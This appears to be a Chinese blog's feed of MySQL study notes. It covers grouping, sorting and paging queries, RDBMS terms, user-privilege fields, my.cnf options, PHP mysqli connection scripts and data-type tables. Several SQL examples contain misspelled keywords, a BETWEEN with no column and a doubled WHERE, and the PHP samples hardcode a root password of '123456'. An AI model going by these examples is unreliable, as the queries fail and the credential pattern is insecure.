class="code"><pre><span class="line">SELECT GENDER,COUNT(*) FROM EMP GROUP BY GENDER;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELLECT WORKADDRESS,COUNT(*) FROM EMP WHERE AGE &lt; 45 GROUP BY WORKADDRESS HAVING COUNT(*) &gt;= 3;</span><br></pre></td></tr></table></figure><h2 id="排序查询">排序查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELLECT 字段列表 FROM TABLE_NAME ORDER BY 字段1 排序方式1,字段2 排序方式2;</span><br></pre></td></tr></table></figure><ul><li><p>ASC(升序)（默认）</p></li><li><p>DESC（降序）</p></li><li><p>如果是多字段排序，当第一个字段的VALUE相同的时候，才会根据第二个字段排序</p></li></ul><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM EMP ORDER BY AGE ASC;</span><br></pre></td></tr></table></figure><p>ASC可省略（默认）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FORM EMP ORDER BY AGE ASC,TIME DESC;</span><br></pre></td></tr></table></figure><h2 id="分页查询">分页查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表 FROM TABLE_NAME LIMIT 起始索引,查询的记录数;</span><br></pre></td></tr></table></figure><ul><li>起始索引从0开始，起始索引= *<em>（查询页码-1）<em>每页显示记录数</em></em></li><li>分页查询是数据库的方言，不同的数据库有不同的实现，MYSQL中是LIMIT</li><li>如果查询的是 第一页数据，起始索引可以省略，简写为LIMIT 10；</li></ul><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FORM EMP LIMIT 0,10;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FORM EMP LIMIT 10,10;</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM EMP WHERE GENDER = &#x27;NV&#x27; AND AGE IN (20,21,22,23);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FORM EMP WHERE GENDER = &#x27;NAN&#x27; ADN BETWEEN 20 AND 40 AND NAME LIKE &#x27;___&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT GENDER, COUNT(*) FORM EMP WHERE AGE &lt;60 GROUP BY GENGDER;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECLECT NAME , AGE FORM EMP WHERE AGE &lt;= 35 ORDER BY AGE ASC , TIME DESC;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FORM EMP WHERE AGE BETWEEN 20 AND 40 WHERE GENDER = &#x27;NAN&#x27; ORDER BY AGE ASC , TIME DESC LIMIT 5;</span><br></pre></td></tr></table></figure><h2 id="DQL执行顺序">DQL执行顺序</h2><p>执行顺序FROM→  WHERE→ GROUP BY →SELECT →ORDER BY →LIMIT</p><h2 id="小结">小结</h2><p>语言编写顺序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表</span><br><span class="line">FROM 表名查询</span><br><span class="line">WHERE 条件列表</span><br><span class="line">GROUP BY 分组字段列表</span><br><span class="line">HAVING 分组后条件列表</span><br><span class="line">ORDER BY 排序字段列表</span><br><span class="line">LIMIT 分页参数</span><br></pre></td></tr></table></figure><h1>DQL多表查询</h1>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql BASIC</title>
      <link href="/2024/07/04/mysql1/"/>
      <url>/2024/07/04/mysql1/</url>
      
        <content type="html"><![CDATA[<h1>数据库</h1><h2 id="认识数据库">认识数据库</h2><p>数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。</p><p>每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。</p><p>我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。</p><p>所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理大数据量。所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。</p><p>RDBMS 即关系数据库管理系统(Relational Database Management System)的特点：</p><ul><li>1.数据以表格的形式出现</li><li>2.每行为各种记录名称</li><li>3.每列为记录名称所对应的数据域</li><li>4.许多的行和列组成一张表单</li><li>5.若干的表单组成database</li></ul><p>RDBMS术语</p><ul><li><strong>数据库:</strong> 数据库是一些关联表的集合。</li><li><strong>数据表:</strong> 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。</li><li><strong>列:</strong> 一列(数据元素) 包含了相同类型的数据, 例如邮政编码的数据。</li><li>**行：**一行（元组，或记录）是一组相关的数据，例如一条用户订阅的数据。</li><li><strong>冗余</strong>：存储两倍数据，冗余降低了性能，但提高了数据的安全性。</li><li><strong>主键</strong>：主键是唯一的。一个数据表中只能包含一个主键。你可以使用主键来查询数据。</li><li>**外键：**外键用于关联两个表。</li><li><strong>复合键</strong>：复合键（组合键）将多个列作为一个索引键，一般用于复合索引。</li><li>**索引：**使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。</li><li><strong>参照完整性:</strong> 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性。</li></ul><p>Mysql为关系型数据库，关系型数据库可以理解为表格的概念，一个关系型数据库由一个或数个表格构成</p><ul><li>表头(header): 每一列的名称;</li><li>列(col): 具有相同数据类型的数据的集合;</li><li>行(row): 每一行用来描述某条记录的具体信息;</li><li>值(value): 行的具体信息, 每个值必须与该列的数据类型相同;</li><li><strong>键(key)</strong>: 键的值在当前列中具有唯一性。</li></ul><h2 id="MySQL数据库">MySQL数据库</h2><p>MySQL 是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</p><ul><li>MySQL 是开源的，目前隶属于 Oracle 旗下产品。</li><li>MySQL 支持大型的数据库。可以处理拥有上千万条记录的大型数据库。</li><li>MySQL 使用标准的 SQL 数据语言形式。</li><li>MySQL 可以运行于多个系统上，并且支持多种语言。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。</li><li>MySQL 对 PHP 有很好的支持，PHP 是很适合用于 Web 程序开发。</li><li>MySQL 支持大型数据库，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。</li><li>MySQL 是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。</li></ul><h2 id="安装mysql">安装mysql</h2><p>安装的前面就不多说了直接去官网下载即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin --version</span><br></pre></td></tr></table></figure><p>验证mysql的安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin  Ver 8.0.37 for Win64 on x86_64 (MySQL Community Server - GPL)</span><br></pre></td></tr></table></figure><p>我的回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure><p>启动mysql服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop mysql</span><br></pre></td></tr></table></figure><p>关闭mysql</p><p>在 MySQL 中，mysql.user 表存储了关于用户账户的信息，包括权限和身份验证方式，以下是 <strong>mysql.user</strong> 表中的常见字段列表及其含义：</p><ul><li><code>Host</code>: 用户连接的来源主机。</li><li><code>User</code>: 用户名。</li><li><code>Password</code>: 加密后的密码。</li><li><code>Select_priv</code>: 是否允许用户执行 SELECT 操作。</li><li><code>Insert_priv</code>: 是否允许用户执行 INSERT 操作。</li><li><code>Update_priv</code>: 是否允许用户执行 UPDATE 操作。</li><li><code>Delete_priv</code>: 是否允许用户执行 DELETE 操作。</li><li><code>Create_priv</code>: 是否允许用户创建新表或数据库。</li><li><code>Drop_priv</code>: 是否允许用户删除表或数据库。</li><li><code>Reload_priv</code>: 是否允许用户执行 FLUSH 操作。</li><li><code>Shutdown_priv</code>: 是否允许用户执行 SHUTDOWN 操作。</li><li><code>Process_priv</code>: 是否允许用户查看其他用户的进程。</li><li><code>File_priv</code>: 是否允许用户执行文件操作（如 LOAD DATA INFILE）。</li><li><code>Grant_priv</code>: 是否允许用户授予或撤销其他用户的权限。</li><li><code>References_priv</code>: 是否允许用户创建外键约束。</li><li><code>Index_priv</code>: 是否允许用户创建或删除索引。</li><li><code>Alter_priv</code>: 是否允许用户执行 ALTER TABLE 操作。</li><li><code>Show_db_priv</code>: 是否允许用户执行 SHOW DATABASES 操作。</li><li><code>Super_priv</code>: 是否允许用户执行超级权限的操作。</li><li><code>Create_tmp_table_priv</code>: 是否允许用户创建临时表。</li><li><code>Lock_tables_priv</code>: 是否允许用户锁定表。</li><li><code>Execute_priv</code>: 是否允许用户执行存储过程和函数。</li><li><code>Repl_slave_priv</code>: 是否允许用户作为复制从库。</li><li><code>Repl_client_priv</code>: 是否允许用户作为复制客户端。</li><li><code>Create_view_priv</code>: 是否允许用户创建视图。</li><li><code>Show_view_priv</code>: 是否允许用户执行 SHOW CREATE VIEW 操作。</li><li><code>Create_routine_priv</code>: 是否允许用户创建存储过程和函数。</li><li><code>Alter_routine_priv</code>: 是否允许用户修改存储过程和函数。</li><li><code>Create_user_priv</code>: 是否允许用户创建、删除和重命名用户。</li><li><code>Event_priv</code>: 是否允许用户创建、修改、删除事件。</li><li><code>Trigger_priv</code>: 是否允许用户创建、修改、删除触发器。</li><li><code>Create_tablespace_priv</code>: 是否允许用户创建和删除表空间。</li><li><code>ssl_type</code>: SSL 类型。</li><li><code>ssl_cipher</code>: SSL 密码。</li><li><code>x509_issuer</code>: X.509 证书颁发者。</li><li><code>x509_subject</code>: X.509 证书主题。</li><li><code>max_questions</code>: 用户可以执行的最大查询数量。</li><li><code>max_updates</code>: 用户可以执行的最大更新数量。</li><li><code>max_connections</code>: 用户可以同时打开的最大连接数。</li><li><code>max_user_connections</code>: 用户可以同时打开的最大用户连接数。</li></ul><h2 id="etc-my-cnf-文件配置">/etc/my.cnf 文件配置</h2><p>/etc/my.cnf 文件是 MySQL 配置文件，用于配置 MySQL 服务器的各种参数和选项。</p><p>一般情况下，你不需要修改该配置文件，该文件默认配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">socket=/var/lib/mysql/mysql.sock</span><br><span class="line"></span><br><span class="line">[mysql.server]</span><br><span class="line">user=mysql</span><br><span class="line">basedir=/var/lib</span><br><span class="line"></span><br><span class="line">[safe_mysqld]</span><br><span class="line">err-log=/var/log/mysqld.log</span><br><span class="line">pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-基本设置">1. 基本设置</h3><ul><li><code>basedir</code>: MySQL 服务器的基本安装目录。</li><li><code>datadir</code>: 存储 MySQL 数据文件的位置。</li><li><code>socket</code>: MySQL 服务器的 Unix 套接字文件路径。</li><li><code>pid-file</code>: 存储当前运行的 MySQL 服务器进程 ID 的文件路径。</li><li><code>port</code>: MySQL 服务器监听的端口号，默认是 3306。</li></ul><h3 id="2-服务器选项">2. 服务器选项</h3><ul><li><code>bind-address</code>: 指定 MySQL 服务器监听的 IP 地址，可以是 IP 地址或主机名。</li><li><code>server-id</code>: 在复制配置中，为每个 MySQL 服务器设置一个唯一的标识符。</li><li><code>default-storage-engine</code>: 默认的存储引擎，例如 InnoDB 或 MyISAM。</li><li><code>max_connections</code>: 服务器可以同时维持的最大连接数。</li><li><code>thread_cache_size</code>: 线程缓存的大小，用于提高新连接的启动速度。</li><li><code>query_cache_size</code>: 查询缓存的大小，用于提高相同查询的效率。</li><li><code>default-character-set</code>: 默认的字符集。</li><li><code>collation-server</code>: 服务器的默认排序规则。</li></ul><h3 id="3-性能调优">3. 性能调优</h3><ul><li><code>innodb_buffer_pool_size</code>: InnoDB 存储引擎的缓冲池大小，这是 InnoDB 性能调优中最重要的参数之一。</li><li><code>key_buffer_size</code>: MyISAM 存储引擎的键缓冲区大小。</li><li><code>table_open_cache</code>: 可以同时打开的表的缓存数量。</li><li><code>thread_concurrency</code>: 允许同时运行的线程数。</li></ul><h3 id="4-安全设置">4. 安全设置</h3><ul><li><code>skip-networking</code>: 禁止 MySQL 服务器监听网络连接，仅允许本地连接。</li><li><code>skip-grant-tables</code>: 以无需密码的方式启动 MySQL 服务器，通常用于恢复忘记的 root 密码，但这是一个安全风险。</li><li><code>auth_native_password=1</code>: 启用 MySQL 5.7 及以上版本的原生密码认证。</li></ul><h3 id="5-日志设置">5. 日志设置</h3><ul><li><code>log_error</code>: 错误日志文件的路径。</li><li><code>general_log</code>: 记录所有客户端连接和查询的日志。</li><li><code>slow_query_log</code>: 记录执行时间超过特定阈值的慢查询。</li><li><code>log_queries_not_using_indexes</code>: 记录未使用索引的查询。</li></ul><h3 id="6-复制设置">6. 复制设置</h3><ul><li><code>master_host</code> 和 <code>master_user</code>: 主服务器的地址和复制用户。</li><li><code>master_password</code>: 复制用户的密码。</li><li><code>master_log_file</code> 和 <code>master_log_pos</code>: 用于复制的日志文件和位置。</li></ul><h3 id="7-管理MySQL的命令">7.管理MySQL的命令</h3><p><strong>USE *数据库名*</strong></p><p>选择要操作的Mysql数据库，使用该命令后所有Mysql命令都只针对该数据库。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use RUNOOB</span><br></pre></td></tr></table></figure><p><strong>SHOW DATABASES:</strong></p><p>列出 MySQL 数据库管理系统的数据库列表。</p><p><strong>SHOW TABLES:</strong></p><p>显示指定数据库的所有表，使用该命令前需要使用 use 命令来选择要操作的数据库。</p><p><strong>SHOW COLUMNS FROM *数据表*:</strong></p><p>显示数据表的属性，属性类型，主键信息 ，是否为 NULL，默认值等其他信息。</p><p><strong>SHOW INDEX FROM *数据表*</strong></p><p>显示数据表的详细索引信息，包括PRIMARY KEY（主键）。</p><p><strong>SHOW TABLE STATUS [FROM db_name] [LIKE ‘pattern’] \G:</strong></p><h3 id="8-PHP脚本连接数据库">8.PHP脚本连接数据库</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbhost</span> = <span class="string">&#x27;localhost&#x27;</span>;  <span class="comment">// mysql服务器主机地址</span></span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&#x27;root&#x27;</span>;            <span class="comment">// mysql用户名</span></span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&#x27;123456&#x27;</span>;          <span class="comment">// mysql用户名密码</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="variable">$conn</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;数据库连接成功！&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="数据库的应用（基于命令）">数据库的应用（基于命令）</h2><h3 id="数据库基本操作">数据库基本操作</h3><h4 id="创建数据库">创建数据库</h4><p>我们可以在登陆 MySQL 服务后，使用 <strong>create</strong> 命令创建数据库，语法如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure><p>如果你希望在创建数据库时指定一些选项，可以使用 CREATE DATABASE 语句的其他参数，例如，你可以指定字符集和排序规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE mydatabase</span><br><span class="line">  CHARACTER SET utf8mb4</span><br><span class="line">  COLLATE utf8mb4_general_ci;</span><br></pre></td></tr></table></figure><p>如果数据库已经存在，执行 CREATE DATABASE 将导致错误。</p><p>为了避免这种情况，你可以在 CREATE DATABASE 语句中添加 IF NOT EXISTS 子句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS mydatabase;</span><br></pre></td></tr></table></figure><p>以下是使用 mysqladmin 创建数据库的基本语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin -u your_username -p create your_database</span><br></pre></td></tr></table></figure><p>在navicat中直接通过ui界面进行创建链接创建数据库</p><p>或者是在在 Navicat 中执行 SQL 命令：</p><ol><li>打开 Navicat 并连接到你的 MySQL 服务器。</li><li>在左侧的连接列表中找到你的 MySQL 服务器，右键点击连接，然后选择“新建查询”。</li><li>在查询编辑器中输入以下 SQL 命令来创建数据库：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE your_database;</span><br></pre></td></tr></table></figure><p>如果你希望在创建数据库时指定字符集和排序规则，可以使用 <strong>-default-character-set</strong> 和 <strong>-default-collation</strong> 参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin -u your_username -p create your_database \</span><br><span class="line">  --default-character-set=utf8mb4 \</span><br><span class="line">  --default-collation=utf8mb4_general_ci</span><br></pre></td></tr></table></figure><p>php脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;连接错误: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &#x27;CREATE DATABASE RUNOOB&#x27;;</span><br><span class="line">$retval = mysqli_query($conn,$sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;创建数据库失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据库 RUNOOB 创建成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="删除数据库">删除数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DROP DATABASE &lt;database_name&gt;;        -- 直接删除数据库，不检查是否存在</span><br><span class="line">或</span><br><span class="line">DROP DATABASE [IF EXISTS] &lt;database_name&gt;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>IF EXISTS</code> 是一个可选的子句，表示如果数据库存在才执行删除操作，避免因为数据库不存在而引发错误。</li></ul><p>以下是使用 mysqladmin 删除数据库的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin -u your_username -p drop your_database</span><br></pre></td></tr></table></figure><h5 id="使用-PHP-脚本删除数据库">使用 PHP 脚本删除数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &#x27;DROP DATABASE RUNOOB&#x27;;</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;删除数据库失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据库 RUNOOB 删除成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="选择数据库">选择数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE database_name;</span><br></pre></td></tr></table></figure><p>mysqlamin:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u your_username -p -D your_database</span><br></pre></td></tr></table></figure><p>php脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&#x27;;</span><br><span class="line">mysqli_select_db($conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="数据类型">数据类型</h2><p>MySQL 支持所有标准 SQL 数值数据类型。</p><p>这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL 和 NUMERIC)，以及近似数值数据类型(FLOAT、REAL 和 DOUBLE PRECISION)。</p><p>关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。</p><p>BIT数据类型保存位字段值，并且支持 MyISAM、MEMORY、InnoDB 和 BDB表。</p><p>作为 SQL 标准的扩展，MySQL 也支持整数类型 TINYINT、MEDIUMINT 和 BIGINT。下面的表显示了需要的每个整数类型的存储和范围。</p><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left">大小</th><th style="text-align:center">范围（有符号）</th><th style="text-align:left">范围（无符号）</th><th style="text-align:left">用途</th></tr></thead><tbody><tr><td style="text-align:left">TINYINT</td><td style="text-align:left">1 Bytes</td><td style="text-align:center">(-128，127)</td><td style="text-align:left">(0，255)</td><td style="text-align:left">小整数值</td></tr><tr><td style="text-align:left">SMALLINT</td><td style="text-align:left">2 Bytes</td><td style="text-align:center">(-32 768，32 767)</td><td style="text-align:left">(0，65 535)</td><td style="text-align:left">大整数值</td></tr><tr><td style="text-align:left">MEDIUMINT</td><td style="text-align:left">3 Bytes</td><td style="text-align:center">(-8 388 608，8 388 607)</td><td style="text-align:left">(0，16 777 215)</td><td style="text-align:left">大整数值</td></tr><tr><td style="text-align:left">INT或INTEGER</td><td style="text-align:left">4 Bytes</td><td style="text-align:center">(-2 147 483 648，2 147 483 647)</td><td style="text-align:left">(0，4 294 967 295)</td><td style="text-align:left">大整数值</td></tr><tr><td style="text-align:left">BIGINT</td><td style="text-align:left">8 Bytes</td><td style="text-align:center">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td><td style="text-align:left">(0，18 446 744 073 709 551 615)</td><td style="text-align:left">极大整数值</td></tr><tr><td style="text-align:left">FLOAT</td><td style="text-align:left">4 Bytes</td><td style="text-align:center">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td><td style="text-align:left">0，(1.175 494 351 E-38，3.402 823 466 E+38)</td><td style="text-align:left">单精度 浮点数值</td></tr><tr><td style="text-align:left">DOUBLE</td><td style="text-align:left">8 Bytes</td><td style="text-align:center">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td style="text-align:left">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td style="text-align:left">双精度 浮点数值</td></tr><tr><td style="text-align:left">DECIMAL</td><td style="text-align:left">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td><td style="text-align:center">依赖于M和D的值</td><td style="text-align:left">依赖于M和D的值</td><td style="text-align:left">小数值</td></tr></tbody></table><p>表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR。</p><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left">大小 ( bytes)</th><th style="text-align:left">范围</th><th style="text-align:left">格式</th><th style="text-align:left">用途</th></tr></thead><tbody><tr><td style="text-align:left">DATE</td><td style="text-align:left">3</td><td style="text-align:left">1000-01-01/9999-12-31</td><td style="text-align:left">YYYY-MM-DD</td><td style="text-align:left">日期值</td></tr><tr><td style="text-align:left">TIME</td><td style="text-align:left">3</td><td style="text-align:left">‘-838:59:59’/‘838:59:59’</td><td style="text-align:left">HH:MM:SS</td><td style="text-align:left">时间值或持续时间</td></tr><tr><td style="text-align:left">YEAR</td><td style="text-align:left">1</td><td style="text-align:left">1901/2155</td><td style="text-align:left">YYYY</td><td style="text-align:left">年份值</td></tr><tr><td style="text-align:left">DATETIME</td><td style="text-align:left">8</td><td style="text-align:left">‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td><td style="text-align:left">YYYY-MM-DD hh:mm:ss</td><td style="text-align:left">混合日期和时间值</td></tr><tr><td style="text-align:left">TIMESTAMP</td><td style="text-align:left">4</td><td style="text-align:left">‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC结束时间是第 